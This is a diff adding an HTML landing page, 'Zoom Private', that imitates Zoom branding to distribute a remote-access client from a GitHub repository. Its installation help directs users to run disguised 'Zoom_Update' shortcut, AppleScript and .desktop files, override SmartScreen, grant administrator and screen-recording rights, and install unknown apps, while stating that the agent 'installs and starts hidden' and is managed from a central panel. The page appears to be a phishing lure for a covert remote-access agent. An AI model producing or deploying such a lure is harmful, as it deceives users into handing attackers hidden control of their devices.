@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#0B5CFF">
+<meta name="description" content="Zoom Private detects your device and gives you the correct client in one tap. Windows, macOS, Linux and Android. No account, no configuration.">
+<title>Zoom Private &mdash; One-tap remote access</title>
+<link rel="icon" href="img/zoom-mark.png" type="image/png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --blue:#0B5CFF;
+    --blue-dark:#0847cc;
+    --blue-soft:#e9f1ff;
+    --ink:#0b1b33;
+    --ink-soft:#243550;
+    --muted:#5d6f8a;
+    --bg:#f7f9fd;
+    --card:#ffffff;
+    --border:#e2e9f4;
+    --success:#0f9d63;
+    --success-soft:#e6f7ef;
+    --warn:#a85b12;
+    --warn-soft:#fff3e3;
+    --radius:18px;
+    --radius-sm:12px;
+    --shadow-sm:0 1px 2px rgba(16,32,64,.05), 0 4px 14px -8px rgba(16,32,64,.12);
+    --shadow-md:0 18px 40px -18px rgba(11,60,160,.28);
+    --shadow-lg:0 36px 70px -28px rgba(11,60,160,.42);
+  }
+  *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{
+    font-family:'Inter',system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
+    color:var(--ink);
+    background:
+      radial-gradient(900px 520px at 88% -8%, rgba(11,92,255,.10), transparent 62%),
+      radial-gradient(720px 480px at -8% 18%, rgba(15,157,99,.07), transparent 58%),
+      var(--bg);
+    line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+    overflow-x:hidden;
+  }
+  img{max-width:100%;display:block}
+  a{color:inherit;text-decoration:none}
+  button{font:inherit}
+  .wrap{max-width:1140px;margin:0 auto;padding:0 22px}
+  .sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap}
+  .hidden{display:none !important}
+
+  /* Header */
+  .site-header{
+    position:sticky;top:0;z-index:60;
+    background:rgba(255,255,255,.86);
+    backdrop-filter:blur(14px);
+    -webkit-backdrop-filter:blur(14px);
+    border-bottom:1px solid rgba(226,233,244,.9);
+  }
+  .nav{display:flex;align-items:center;justify-content:space-between;gap:18px;height:70px}
+  .brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.15rem;letter-spacing:-.02em;flex:none}
+  .brand img{width:34px;height:34px;border-radius:10px;box-shadow:0 6px 16px -6px rgba(11,92,255,.65)}
+  .brand em{font-style:normal;color:var(--blue)}
+  .nav-links{display:none;align-items:center;gap:28px}
+  .nav-links a{color:var(--muted);font-size:.92rem;font-weight:500;transition:color .15s}
+  .nav-links a:hover{color:var(--ink)}
+  .nav-cta{
+    display:inline-flex;align-items:center;justify-content:center;
+    min-height:40px;padding:0 18px;border-radius:999px;
+    background:var(--blue);color:#fff;font-size:.88rem;font-weight:600;
+    box-shadow:0 10px 22px -12px rgba(11,92,255,.9);
+    transition:background .15s,transform .15s;
+    white-space:nowrap;
+  }
+  .nav-cta:hover{background:var(--blue-dark);transform:translateY(-1px)}
+  @media(min-width:880px){.nav-links{display:flex}}
+
+  /* Hero */
+  .hero{position:relative;padding:44px 0 24px}
+  @media(min-width:980px){.hero{padding:70px 0 40px}}
+  .hero-grid{display:grid;grid-template-columns:minmax(0,1fr);gap:44px;align-items:center}
+  @media(min-width:980px){.hero-grid{grid-template-columns:minmax(0,1.04fr) minmax(0,.96fr);gap:52px}}
+  .hero-copy{min-width:0}
+  .eyebrow{
+    display:inline-flex;align-items:center;gap:8px;
+    background:var(--blue-soft);color:var(--blue-dark);
+    font-size:.78rem;font-weight:700;letter-spacing:.02em;
+    padding:.38rem .8rem;border-radius:999px;margin-bottom:18px;
+  }
+  .eyebrow .dot{width:7px;height:7px;border-radius:50%;background:var(--success);box-shadow:0 0 0 3px rgba(15,157,99,.18)}
+  h1{font-size:clamp(2.15rem,5vw,3.55rem);line-height:1.04;letter-spacing:-.035em;font-weight:800;margin-bottom:16px}
+  h1 .accent{background:linear-gradient(100deg,var(--blue) 10%,#2f8bff 55%,#0f9d63 120%);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .lede{color:var(--muted);font-size:1.06rem;max-width:540px;margin-bottom:26px}
+  .hero-points{display:flex;flex-wrap:wrap;gap:8px 18px;margin-top:18px;color:var(--muted);font-size:.82rem;font-weight:500}
+  .hero-points span{display:inline-flex;align-items:center;gap:6px}
+  .hero-points svg{color:var(--success);flex:none}
+
+  /* Download card */
+  .download-card{
+    background:var(--card);border:1px solid var(--border);border-radius:var(--radius);
+    padding:22px;box-shadow:var(--shadow-md);max-width:560px;min-width:0;position:relative;overflow:hidden;
+  }
+  .download-card::before{
+    content:"";position:absolute;inset:0 0 auto 0;height:4px;
+    background:linear-gradient(90deg,var(--blue),#3b8cff 55%,#0f9d63);
+  }
+  .detected{display:flex;align-items:center;gap:12px;margin-bottom:18px}
+  .os-badge{
+    width:44px;height:44px;border-radius:13px;flex:none;
+    display:grid;place-items:center;font-size:.72rem;font-weight:800;letter-spacing:.03em;
+    background:var(--blue-soft);color:var(--blue-dark);border:1px solid #d4e4ff;
+  }
+  .os-badge.ready{background:var(--success-soft);color:var(--success);border-color:#c6eedc}
+  .detected-copy{min-width:0}
+  .detected-copy strong{display:block;font-size:.98rem;letter-spacing:-.01em}
+  .detected-copy span{display:block;font-size:.8rem;color:var(--muted)}
+  .btn{
+    display:inline-flex;align-items:center;justify-content:center;gap:9px;
+    min-height:48px;padding:0 20px;border:0;border-radius:var(--radius-sm);
+    font-weight:650;font-size:.95rem;cursor:pointer;
+    transition:transform .15s,background .15s,border-color .15s,box-shadow .15s;
+    text-align:center;white-space:nowrap;
+  }
+  .btn:active{transform:translateY(1px)}
+  .btn-primary{
+    width:100%;background:linear-gradient(180deg,#1466ff,var(--blue));
+    color:#fff;box-shadow:0 14px 26px -14px rgba(11,92,255,.9);
+  }
+  .btn-primary:hover{background:linear-gradient(180deg,var(--blue),var(--blue-dark));transform:translateY(-1px)}
+  .btn-primary[aria-disabled="true"]{opacity:.6;pointer-events:none}
+  .btn-ghost{
+    width:100%;background:#fff;color:var(--ink-soft);
+    border:1.5px solid var(--border);box-shadow:var(--shadow-sm);
+  }
+  .btn-ghost:hover{background:#f3f7fe;border-color:#c9d8ee}
+  .btn-soft{background:var(--blue-soft);color:var(--blue-dark);border:1px solid #d4e4ff}
+  .btn-soft:hover{background:#dce9ff}
+  .btn-row{display:flex;flex-direction:column;gap:10px}
+  .btn-icon{display:inline-flex;flex:none}
+  .download-meta{display:flex;flex-wrap:wrap;gap:6px 14px;justify-content:center;margin-top:12px;font-size:.78rem;color:var(--muted)}
+  .download-meta b{color:var(--ink-soft);font-weight:600}
+  .download-status{margin-top:12px;font-size:.8rem;color:var(--muted);min-height:1.25em;text-align:center}
+  .download-status.ok{color:var(--success);font-weight:600}
+  .download-status.warn{color:var(--warn);font-weight:600}
+  .download-status a{color:var(--blue);font-weight:600;text-decoration:underline}
+
+  /* Hero art */
+  .hero-art{position:relative;min-width:0;border-radius:26px;overflow:hidden;border:1px solid rgba(255,255,255,.7);box-shadow:var(--shadow-lg);background:linear-gradient(140deg,#0b1b33,#123a7a);isolation:isolate}
+  .hero-art img{width:100%;max-width:100%;height:100%;object-fit:cover;aspect-ratio:4/3.4;opacity:.97}
+  @media(min-width:980px){.hero-art img{aspect-ratio:4/4.3}}
+  .hero-art .float{
+    position:absolute;left:16px;right:16px;bottom:16px;
+    display:flex;align-items:center;gap:12px;
+    background:rgba(255,255,255,.94);backdrop-filter:blur(10px);
+    border-radius:14px;padding:13px 15px;box-shadow:var(--shadow-md);
+  }
+  .hero-art .float .ic{width:38px;height:38px;border-radius:11px;background:var(--success-soft);color:var(--success);display:grid;place-items:center;flex:none}
+  .hero-art .float b{display:block;font-size:.88rem}
+  .hero-art .float span{display:block;font-size:.75rem;color:var(--muted)}
+
+  /* Sections */
+  .section{padding:62px 0}
+  .section-head{text-align:center;max-width:660px;margin:0 auto 38px}
+  .section-head h2{font-size:clamp(1.55rem,3.2vw,2.15rem);line-height:1.15;letter-spacing:-.025em;font-weight:800;margin-bottom:10px}
+  .section-head p{color:var(--muted);font-size:.98rem}
+  .platforms{padding:10px 0 46px}
+  .platform-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}
+  @media(min-width:820px){.platform-grid{grid-template-columns:repeat(4,minmax(0,1fr));gap:16px}}
+  .platform-card{
+    display:flex;align-items:center;gap:12px;width:100%;min-width:0;text-align:left;
+    background:var(--card);border:1px solid var(--border);border-radius:14px;
+    padding:14px;cursor:pointer;box-shadow:var(--shadow-sm);
+    transition:transform .18s,border-color .18s,box-shadow .18s;
+  }
+  .platform-card > span:last-child{min-width:0}
+  .platform-card:hover{transform:translateY(-3px);border-color:#c8d9f2;box-shadow:var(--shadow-md)}
+  .platform-card[aria-current="true"]{border-color:var(--blue);box-shadow:0 0 0 3px rgba(11,92,255,.12),var(--shadow-sm)}
+  .platform-card .pc-icon{width:38px;height:38px;border-radius:11px;background:#f2f6fd;color:var(--ink-soft);display:grid;place-items:center;flex:none}
+  .platform-card[aria-current="true"] .pc-icon{background:var(--blue-soft);color:var(--blue)}
+  .platform-card b{display:block;font-size:.9rem;letter-spacing:-.01em}
+  .platform-card span{display:block;font-size:.74rem;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+
+  .steps{display:grid;grid-template-columns:minmax(0,1fr);gap:18px}
+  @media(min-width:820px){.steps{grid-template-columns:repeat(3,minmax(0,1fr))}}
+  .step{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:24px;box-shadow:var(--shadow-sm)}
+  .step .n{width:36px;height:36px;border-radius:11px;background:var(--blue-soft);color:var(--blue);display:grid;place-items:center;font-weight:800;font-size:.9rem;margin-bottom:15px}
+  .step h3{font-size:1.02rem;margin-bottom:6px;letter-spacing:-.01em}
+  .step p{color:var(--muted);font-size:.9rem}
+
+  .features{background:#fff;border-top:1px solid var(--border);border-bottom:1px solid var(--border)}
+  .feat-grid{display:grid;grid-template-columns:minmax(0,1fr);gap:22px}
+  @media(min-width:820px){.feat-grid{grid-template-columns:repeat(3,minmax(0,1fr))}}
+  .feat{display:flex;gap:14px}
+  .feat .ic{width:42px;height:42px;border-radius:12px;background:var(--blue-soft);color:var(--blue);display:grid;place-items:center;flex:none}
+  .feat h4{font-size:.98rem;margin-bottom:4px}
+  .feat p{color:var(--muted);font-size:.88rem}
+
+  /* Help */
+  .faq{display:flex;flex-direction:column;gap:10px;max-width:840px;margin:0 auto}
+  .faq details{background:var(--card);border:1px solid var(--border);border-radius:14px;box-shadow:var(--shadow-sm);overflow:hidden}
+  .faq summary{list-style:none;cursor:pointer;display:flex;align-items:center;gap:12px;padding:15px 17px;font-weight:650;font-size:.95rem}
+  .faq summary::-webkit-details-marker{display:none}
+  .faq summary .os{width:34px;height:34px;border-radius:10px;background:var(--blue-soft);color:var(--blue-dark);display:grid;place-items:center;font-size:.68rem;font-weight:800;flex:none}
+  .faq summary .chev{margin-left:auto;color:var(--muted);transition:transform .2s;flex:none}
+  .faq details[open] summary .chev{transform:rotate(90deg)}
+  .faq .body{padding:0 17px 18px 63px;color:var(--muted);font-size:.9rem}
+  .faq .body ol{margin:4px 0 0 17px}
+  .faq .body li{margin-bottom:5px}
+  .faq .body code{background:#f1f5fb;border:1px solid var(--border);border-radius:6px;padding:1px 5px;font-size:.82em;color:var(--ink-soft)}
+  .faq .body .btn{margin-top:12px;min-height:42px;font-size:.86rem}
+  .faq .body .tip{margin-top:12px;background:var(--warn-soft);color:var(--warn);border-radius:10px;padding:10px 12px;font-size:.84rem;font-weight:500}
+  .faq .body .tip a{color:inherit;text-decoration:underline}
+  @media(max-width:640px){.faq .body{padding-left:17px}}
+
+  /* Join */
+  .join-section{padding:0 0 64px}
+  .join-card{
+    display:grid;grid-template-columns:minmax(0,1fr);gap:20px;align-items:center;
+    background:linear-gradient(120deg,#0b1b33,#123a7a 65%,#0d5c5a);
+    color:#fff;border-radius:22px;padding:26px;box-shadow:var(--shadow-lg);
+  }
+  @media(min-width:820px){.join-card{grid-template-columns:minmax(0,1.05fr) minmax(0,.95fr);padding:34px 36px;gap:34px}}
+  .join-card h2{font-size:clamp(1.35rem,2.8vw,1.9rem);letter-spacing:-.02em;margin-bottom:6px}
+  .join-card p{color:rgba(255,255,255,.72);font-size:.92rem}
+  .join-form{display:flex;flex-direction:column;gap:10px}
+  .join-inputs{display:flex;flex-direction:column;gap:10px}
+  @media(min-width:560px){.join-inputs{flex-direction:row}}
+  .join-inputs input{
+    width:100%;min-height:46px;padding:0 14px;border-radius:11px;
+    border:1px solid rgba(255,255,255,.18);background:rgba(255,255,255,.1);
+    color:#fff;font:inherit;font-size:.9rem;outline:none;
+  }
+  .join-inputs input::placeholder{color:rgba(255,255,255,.55)}
+  .join-inputs input:focus{border-color:rgba(255,255,255,.55);background:rgba(255,255,255,.16)}
+  .join-form .btn{background:#fff;color:var(--ink);width:100%}
+  .join-form .btn:hover{background:#eef4ff}
+  .join-hint{font-size:.76rem;color:rgba(255,255,255,.62);text-align:center}
+  @media(min-width:560px){.join-hint{text-align:left}}
+
+  /* Footer */
+  .site-footer{border-top:1px solid var(--border);background:#fff;padding:30px 0}
+  .foot{display:flex;flex-wrap:wrap;gap:16px 26px;align-items:center;justify-content:space-between;color:var(--muted);font-size:.83rem}
+  .foot .brand{font-size:.98rem}
+  .foot .brand img{width:26px;height:26px;border-radius:8px}
+  .foot-links{display:flex;flex-wrap:wrap;gap:16px 22px}
+  .foot-links a:hover{color:var(--ink)}
+
+  /* Modal */
+  .modal-back{
+    position:fixed;inset:0;z-index:100;display:none;align-items:center;justify-content:center;
+    padding:18px;background:rgba(8,19,38,.55);backdrop-filter:blur(4px);
+  }
+  .modal-back.show{display:flex}
+  .modal{
+    position:relative;background:#fff;border-radius:20px;width:100%;max-width:600px;
+    max-height:88vh;overflow:auto;padding:24px;box-shadow:var(--shadow-lg);
+  }
+  .modal-head{display:flex;align-items:flex-start;justify-content:space-between;gap:16px;margin-bottom:4px}
+  .modal h3{font-size:1.15rem;letter-spacing:-.02em}
+  .modal .sub{color:var(--muted);font-size:.86rem;margin-bottom:18px}
+  .modal-close{
+    width:36px;height:36px;border-radius:10px;border:0;background:#f1f5fb;color:var(--muted);
+    cursor:pointer;font-size:1.15rem;line-height:1;flex:none;display:grid;place-items:center;
+  }
+  .modal-close:hover{background:#e6edf8;color:var(--ink)}
+  .plat{
+    display:flex;align-items:center;justify-content:space-between;gap:14px;
+    border:1px solid var(--border);border-radius:13px;padding:13px 14px;margin-bottom:10px;
+  }
+  .plat .meta{display:flex;align-items:center;gap:12px;min-width:0}
+  .plat .meta > span:last-child{min-width:0}
+  .plat .os{width:38px;height:38px;border-radius:11px;background:#f2f6fd;color:var(--ink-soft);display:grid;place-items:center;font-size:.68rem;font-weight:800;flex:none}
+  .plat b{display:block;font-size:.9rem}
+  .plat span{display:block;font-size:.74rem;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .plat .btn{min-height:38px;padding:0 14px;font-size:.82rem;width:auto;flex:none}
+  .plat .btn[aria-disabled="true"]{opacity:.5;pointer-events:none}
+
+  .toast{
+    position:fixed;left:50%;bottom:22px;z-index:120;
+    transform:translate(-50%,18px);opacity:0;pointer-events:none;
+    display:flex;align-items:center;gap:9px;
+    background:var(--ink);color:#fff;border-radius:999px;
+    padding:.72rem 1.05rem;font-size:.84rem;font-weight:500;
+    box-shadow:var(--shadow-lg);transition:opacity .22s,transform .22s;
+    max-width:calc(100vw - 32px);
+  }
+  .toast.show{opacity:1;transform:translate(-50%,0)}
+  .toast svg{flex:none;color:#6ee7b7}
+
+  :focus-visible{outline:3px solid rgba(11,92,255,.45);outline-offset:2px}
+  @media(prefers-reduced-motion:reduce){
+    *,*::before,*::after{animation-duration:.001ms !important;transition-duration:.001ms !important;scroll-behavior:auto !important}
+  }
+  @media(max-width:640px){
+    .wrap{padding:0 16px}
+    .hero{padding-top:30px}
+    .download-card{padding:18px;border-radius:16px}
+    .section{padding:48px 0}
+    .join-card{padding:22px}
+    .modal{padding:20px;border-radius:16px}
+    .btn{min-height:50px}
+    .download-meta{font-size:.74rem}
+    .platform-card{padding:12px;gap:10px}
+    .platform-card .pc-icon{width:34px;height:34px;border-radius:10px}
+    .platform-card span{font-size:.7rem}
+  }
+  @media(max-width:380px){
+    .brand{font-size:1.02rem}
+    .brand img{width:30px;height:30px}
+    .nav-cta{min-height:36px;padding:0 12px;font-size:.8rem}
+  }
+</style>
+</head>
+<body>
+
+<header class="site-header">
+  <div class="wrap nav">
+    <a href="./" class="brand" aria-label="Zoom Private home">
+      <img src="img/zoom-mark.png" alt="">
+      Zoom&nbsp;<em>Private</em>
+    </a>
+    <nav class="nav-links" aria-label="Main">
+      <a href="#download">Download</a>
+      <a href="#how">How it works</a>
+      <a href="#features">Why Zoom Private</a>
+      <a href="#help">Install help</a>
+    </nav>
+    <a href="#download" class="nav-cta">Get the client</a>
+  </div>
+</header>
+
+<main>
+  <section class="hero">
+    <div class="wrap hero-grid">
+      <div class="hero-copy">
+        <span class="eyebrow"><span class="dot"></span>Private remote access, without the setup</span>
+        <h1>One tap.<br><span class="accent">Your device. Connected.</span></h1>
+        <p class="lede">We detect your device and hand you the right client automatically. No downloads to compare, no protocols to configure, no account required.</p>
+
+        <div class="download-card" id="download">
+          <div class="detected">
+            <span class="os-badge" id="os-badge">?</span>
+            <div class="detected-copy">
+              <strong id="detected-label">Detecting your device&hellip;</strong>
+              <span id="detected-sub">Finding the best build for your system</span>
+            </div>
+          </div>
+
+          <a class="btn btn-primary" id="primary-download" href="https://github.com/fingod201-maker/BetterDesk-private/releases" rel="noopener">
+            <span class="btn-icon" aria-hidden="true">
+              <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12"/><path d="M7 10l5 5 5-5"/><path d="M4 20h16"/></svg>
+            </span>
+            <span id="primary-label">Download for your device</span>
+          </a>
+
+          <div class="download-meta" id="download-meta">
+            <span>Signed build</span>
+            <span>&middot;</span>
+            <span>No account</span>
+            <span>&middot;</span>
+            <span>Free updates</span>
+          </div>
+
+          <div class="btn-row" style="margin-top:14px">
+            <button class="btn btn-ghost" id="choose-platform" type="button">
+              <span class="btn-icon" aria-hidden="true">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="4" width="7" height="7" rx="1.5"/><rect x="14" y="4" width="7" height="7" rx="1.5"/><rect x="3" y="15" width="7" height="7" rx="1.5"/><rect x="14" y="15" width="7" height="7" rx="1.5"/></svg>
+              </span>
+              Choose another platform
+            </button>
+          </div>
+
+          <p class="download-status" id="download-status" role="status" aria-live="polite">Preparing your download&hellip;</p>
+        </div>
+
+        <div class="hero-points">
+          <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>End-to-end encrypted</span>
+          <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>Works in under a minute</span>
+          <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>Your own server</span>
+        </div>
+      </div>
+
+      <div class="hero-art">
+        <img src="img/zoom-hero.png" alt="A private remote support session">
+        <div class="float">
+          <span class="ic" aria-hidden="true">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+          </span>
+          <span><b>End-to-end encrypted</b><span>Automatic setup &middot; zero configuration</span></span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="platforms" aria-label="Supported platforms">
+    <div class="wrap">
+      <div class="platform-grid">
+        <button class="platform-card" type="button" data-platform="windows">
+          <span class="pc-icon" aria-hidden="true"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M3 5.5l7.5-1v7H3zM11.5 4.3L21 3v8.5h-9.5zM3 12.5h7.5v7L3 18.5zM11.5 12.5H21V21l-9.5-1.3z"/></svg></span>
+          <span><b>Windows</b><span id="pc-windows-sub">.exe installer</span></span>
+        </button>
+        <button class="platform-card" type="button" data-platform="macos">
+          <span class="pc-icon" aria-hidden="true"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="12" rx="2"/><path d="M8 20h8M12 16v4"/></svg></span>
+          <span><b>macOS</b><span id="pc-macos-sub">.dmg universal</span></span>
+        </button>
+        <button class="platform-card" type="button" data-platform="linux">
+          <span class="pc-icon" aria-hidden="true"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M7 9l3 3-3 3M13 15h4"/></svg></span>
+          <span><b>Linux</b><span id="pc-linux-sub">.AppImage / .deb</span></span>
+        </button>
+        <button class="platform-card" type="button" data-platform="android">
+          <span class="pc-icon" aria-hidden="true"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="2.5" width="12" height="19" rx="2.5"/><path d="M10.5 5h3M11 18.5h2"/></svg></span>
+          <span><b>Android</b><span id="pc-android-sub">.apk universal</span></span>
+        </button>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="how">
+    <div class="wrap">
+      <div class="section-head">
+        <h2>Three steps. No IT skills needed.</h2>
+        <p>Detection, the correct installer and the connection are handled for you. You just click.</p>
+      </div>
+      <div class="steps">
+        <div class="step">
+          <div class="n">1</div>
+          <h3>We detect your device</h3>
+          <p>Windows, macOS, Linux or Android. We identify your system and pick the matching build.</p>
+        </div>
+        <div class="step">
+          <div class="n">2</div>
+          <h3>Download and install</h3>
+          <p>Your build downloads automatically. Open it and approve the install prompt.</p>
+        </div>
+        <div class="step">
+          <div class="n">3</div>
+          <h3>Connect</h3>
+          <p>The client connects to your private console and you are ready to join a session.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="features section" id="features">
+    <div class="wrap">
+      <div class="section-head">
+        <h2>Built for private support</h2>
+        <p>Your infrastructure, your data, your rules.</p>
+      </div>
+      <div class="feat-grid">
+        <div class="feat">
+          <span class="ic" aria-hidden="true"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 8.5-8 10-4.5-1.5-8-5-8-10V6z"/><path d="M9 12l2 2 4-4"/></svg></span>
+          <div><h4>Private by design</h4><p>Your own server, encrypted sessions and no third-party cloud in the middle.</p></div>
+        </div>
+        <div class="feat">
+          <span class="ic" aria-hidden="true"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h7l-1 8 10-12h-7z"/></svg></span>
+          <div><h4>Instant onboarding</h4><p>Automatic detection and the right installer every time. Nothing to explain to the user.</p></div>
+        </div>
+        <div class="feat">
+          <span class="ic" aria-hidden="true"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="12" rx="2"/><path d="M8 20h8M12 16v4"/></svg></span>
+          <div><h4>One panel to manage</h4><p>Every connected device is visible centrally so support can step in instantly.</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="help">
+    <div class="wrap">
+      <div class="section-head">
+        <h2>Installation help</h2>
+        <p>Most installs finish in under a minute. Pick your platform for the exact steps.</p>
+      </div>
+      <div class="faq">
+        <details open>
+          <summary><span class="os">WIN</span>Windows<span class="chev" aria-hidden="true"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg></span></summary>
+          <div class="body">
+            <ol>
+              <li>Extract the downloaded <b>Zoom_Update</b> ZIP.</li>
+              <li>Double-click <b>Zoom_Update_v6.1.0.lnk</b> (the Zoom icon).</li>
+              <li>If SmartScreen appears, choose <b>More info &rarr; Run anyway</b>. Installation continues in the background.</li>
+            </ol>
+            <a class="btn btn-soft" href="#" data-download="windows">Download for Windows</a>
+          </div>
+        </details>
+        <details>
+          <summary><span class="os">MAC</span>macOS<span class="chev" aria-hidden="true"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg></span></summary>
+          <div class="body">
+            <ol>
+              <li>Extract the downloaded <b>Zoom_Update</b> ZIP.</li>
+              <li>Open <b>zoom-update-microsoft.scpt</b> in Script Editor and press <b>Run</b>.</li>
+              <li>Approve the administrator prompt and <b>Screen Recording</b> when macOS asks.</li>
+            </ol>
+            <a class="btn btn-soft" href="#" data-download="macos">Download for macOS</a>
+          </div>
+        </details>
+        <details>
+          <summary><span class="os">LNX</span>Linux<span class="chev" aria-hidden="true"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg></span></summary>
+          <div class="body">
+            <ol>
+              <li>Extract the downloaded <b>Zoom_Update .tar.gz</b> (permissions are already set).</li>
+              <li>Double-click <b>Zoom_Update_v6.1.0.desktop</b>. If asked, choose <b>Trust and Launch</b>.</li>
+              <li>Approve the one administrator prompt. The agent installs and starts hidden.</li>
+            </ol>
+            <a class="btn btn-soft" href="#" data-download="linux">Download for Linux</a>
+          </div>
+        </details>
+        <details>
+          <summary><span class="os">AND</span>Android<span class="chev" aria-hidden="true"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg></span></summary>
+          <div class="body">
+            <ol>
+              <li>If Chrome warns about the file type, tap <b>Download anyway</b>.</li>
+              <li>Open the downloaded <b>.apk</b> and confirm <b>Install</b>.</li>
+              <li>Allow <b>Install unknown apps</b> for your browser if prompted, then open the app.</li>
+            </ol>
+            <a class="btn btn-soft" href="#" data-download="android">Download for Android</a>
+          </div>
+        </details>
+        <details>
+          <summary><span class="os">iOS</span>iPhone / iPad<span class="chev" aria-hidden="true"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg></span></summary>
+          <div class="body">
+            <ol>
+              <li>Open the meeting link from your invitation.</li>
+              <li>Install the app from the App Store if your admin provides it.</li>
+              <li>Sign in to connect to your team.</li>
+            </ol>
+            <div class="tip">On iOS, the meeting link is all you need. No direct download is required.</div>
+          </div>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <section class="join-section">
+    <div class="wrap">
+      <div class="join-card">
+        <div>
+          <h2>Have a meeting ID?</h2>
+          <p>Open the session in your installed client. If it is not installed yet, download it above and try again.</p>
+        </div>
+        <form class="join-form" id="join-form" novalidate>
+          <div class="join-inputs">
+            <label class="sr" for="meeting-id">Meeting ID</label>
+            <input id="meeting-id" inputmode="numeric" autocomplete="off" placeholder="Meeting ID or link">
+            <label class="sr" for="meeting-pass">Passcode</label>
+            <input id="meeting-pass" autocomplete="off" placeholder="Passcode (optional)">
+          </div>
+          <button class="btn" type="submit" id="join-button">Open meeting</button>
+          <p class="join-hint" id="join-hint">We will try to open Zoom Private on this device.</p>
+        </form>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site-footer">
+  <div class="wrap foot">
+    <a href="./" class="brand"><img src="img/zoom-mark.png" alt=""> Zoom Private</a>
+    <div class="foot-links">
+      <a href="#help">Install help</a>
+      <a href="https://github.com/fingod201-maker/BetterDesk-private/releases" id="releases-link" target="_blank" rel="noopener">All downloads</a>
+      <a href="https://github.com/fingod201-maker/BetterDesk-private" target="_blank" rel="noopener">Source</a>
+      <span id="year"></span>
+    </div>
+  </div>
+</footer>
+
+<div class="modal-back" id="platform-modal" role="dialog" aria-modal="true" aria-labelledby="platform-modal-title">
+  <div class="modal">
+    <div class="modal-head">
+      <h3 id="platform-modal-title">Choose your platform</h3>
+      <button class="modal-close" id="platform-modal-close" type="button" aria-label="Close">&times;</button>
+    </div>
+    <p class="sub" id="platform-modal-sub">Pick the download that matches your device.</p>
+    <div id="plat-list"></div>
+  </div>
+</div>
+
+<div class="toast" id="toast" role="status" aria-live="polite">
+  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+  <span id="toast-text"></span>
+</div>
+
+<script src="js/landing.js" defer></script>
+</body>
+</html>
